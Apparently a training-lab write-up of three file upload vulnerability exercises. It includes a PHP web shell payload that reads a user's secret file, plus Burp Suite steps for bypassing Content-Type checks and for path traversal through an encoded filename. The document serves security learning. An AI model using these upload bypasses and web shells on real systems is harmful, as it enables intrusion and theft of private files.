# Lab-1: Remote code execution via web shell upload

```php

PAYLOAD: <?php echo file_get_contents('/home/carlos/secret'); ?>

```




![FILE-UPLOAD-VULNERABILITY-LAB-1-RCE-VIA-UPLOAD](https://user-images.githubusercontent.com/98345027/183827329-e98be45c-e763-4e30-85a1-565d42ba9df3.png)



# Lab-2: Web shell upload via Content-Type restriction bypass

```php
PAYLOAD: <?php echo file_get_contents('/home/carlos/secret'); ?>
STEPS
1.FIRST UPLOAD THE SCRIPT(EXAMPLE: SCRIPT.php) AND THEN GO TO PROXY-->HTTP HISTORY FROM THERE SELECT THE 'POST' REQUEST AND SEND IT TO REPEATER OVER THERE CHANGE THE "Content-Type" to "image/jpeg" inorder to bypass file type and then "send" the request .
2.IN THE "RESPONSE" SECTION IT SHOWS MESSAGE THAT THE FILE UPLOAD SUCCESSFULLY "
3.NOW TO RUN THE SCRIPT GO TO PROXY--->HTTP-HISTORY SELECT THE "GET" REQUEST AND ACCESS THE SCRIPT "/images/avtar/newsccript.php' and send the request
4.In "REPONSE SECTION " IT WILL SHOW THE SECRET MESSAGE "
```
```TEXT
ACTUAL FLAW: OVER HERE Content-Type header,  tells the server the MIME type of the data that was submitted using this input. (FOR-EXAMPLE WHETHER THE FILE SUBMITTED OVER HERE ARE IMAGE OR NOT)
BYPASS: SO WE CANGE THE CONTENT-TYPE AND THE SERVER DOESN'T VALIDATE THAT FILE THAT WAS UPLOADED WAS IMAGE FILE OR SOMETHING ELSE
```


![FILE-UPLOAD-VULNERABILITY-LAB-2](https://user-images.githubusercontent.com/98345027/183828255-7d93e239-5e5c-4515-a179-db7138a29a06.png)
![FILE-UPLOAD-VULNERABILITY-LAB-2-1](https://user-images.githubusercontent.com/98345027/183828268-a9c4bf5d-c944-4e9b-b3bd-68fae2cf184b.png)



# Lab-3: Web shell upload via path traversal


```php
1.FIRST UPLOAD THE SCRITPT AND THEN GO TO PROXY-->HTTP-HISTORY,SELECT THE POST REQUEST AND SEND TO "REPEATER-TAB" CHANGE THE 'FILENAME' PARAMETER OF "Content-deposition' by adding url encoding of '/'(for example: filename=..%2fscript.php) , the server will decode the url-encoding and in the Response-tab it will show that '../script.php' has been uploaded so basically server stripped the url-encoding .
2. To access/run the script go to PROXY-->HTTP-HISTORY and select the GET Request  AND SEND TO "REPEATER-TAB" and now add in the GET /files/avatars/..%2fscript.php and send the request  in the response section it will reveal the information of the carlos
```
![FILE-UPLOAD-VULNERABILITY-LAB-3-FILE-UPLOAD](https://user-images.githubusercontent.com/98345027/184068797-343d9c2d-461e-47ca-9e63-87b61a58a022.png)

![FILE-UPLOAD-VULNERABILITY-LAB-3-ACCESSING THE FILE](https://user-images.githubusercontent.com/98345027/184068835-1222a09c-c9d0-4d86-9f0d-66f2149bc828.png)
